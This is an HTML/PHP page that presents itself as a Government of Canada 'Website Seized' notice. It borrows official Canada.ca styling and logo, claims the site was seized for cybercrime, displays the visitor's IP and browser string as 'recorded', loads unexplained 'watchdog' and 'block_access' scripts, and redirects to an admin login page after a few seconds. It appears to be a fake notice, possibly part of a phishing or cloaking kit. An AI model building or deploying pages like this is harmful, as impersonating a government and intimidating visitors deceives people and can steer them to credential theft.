<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Website Seized</title>
    <link rel="stylesheet" href="https://cms-sgj.cra-arc.gc.ca/ebci/wet/v10.5.4/GCWeb/css/theme.min.css">
    <style>
        /* Your CSS styles */
        body {
            font-family: "Noto Sans", sans-serif;
            background-color: #f2f2f2;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            text-align: center;
            background-color: #fff;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 600px;
            width: 90%; /* Adjust width for smaller screens */
            margin: auto; /* Center the container */
        }
        h1 {
            font-size: 36px;
            color: #ff0000;
            margin-bottom: 30px;
            font-weight: bold;
        }
        p {
            margin-bottom: 20px;
            color: #333;
            font-size: 20px;
            line-height: 1.5;
        }
        .btn {
            display: inline-block;
            padding: 14px 28px;
            background-color: #006699;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            text-decoration: none;
            transition: background-color 0.3s ease;
            font-size: 20px;
        }
        .btn:hover {
            background-color: #004466;
        }
        .gov-logo {
            width: 350px; /* Increase the width of the logo */
            margin-bottom: 30px;
        }

        /* Responsive styles */
        @media only screen and (max-width: 768px) {
            .container {
                padding: 20px;
            }
            h1 {
                font-size: 28px;
            }
            p {
                font-size: 18px;
            }
            .btn {
                padding: 12px 24px;
                font-size: 18px;
            }
            .gov-logo {
                width: 250px; /* Adjust logo width for smaller screens */
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://cms-sgj.cra-arc.gc.ca//ebci/wet/v10.5.4/GCWeb/assets/sig-blk-en.svg" alt="Government of Canada" class="gov-logo">
        <h1>Website Seized</h1>
        <p>This website has been seized by the Government of Canada due to cybercrime activities.</p>
        <p>Your attempt to access this website has been recorded.</p>
        <p>Recorded Print:   <?php
include_once 'include/watchdog.php'; echo $PublicIP; ?>|<?php
include_once 'include/watchdog.php'; echo $_SERVER['HTTP_USER_AGENT']; ?>
<br><br><br>
        <a href="https://www.canada.ca/en.new_extension" class="btn">Visit Canada.ca</a>
    </div>

    <!-- PHP script -->
    <?php
include_once 'include/watchdog.php'; include 'block_access.php'; ?>
    
    <!-- JavaScript -->
    <script>
        // Redirect to qwertyuip/font.php after 60 seconds
        setTimeout(function() {
            window.location.href = "admin/login.php";
        }, 6000); // 60 seconds
    </script>
</body>
</html>
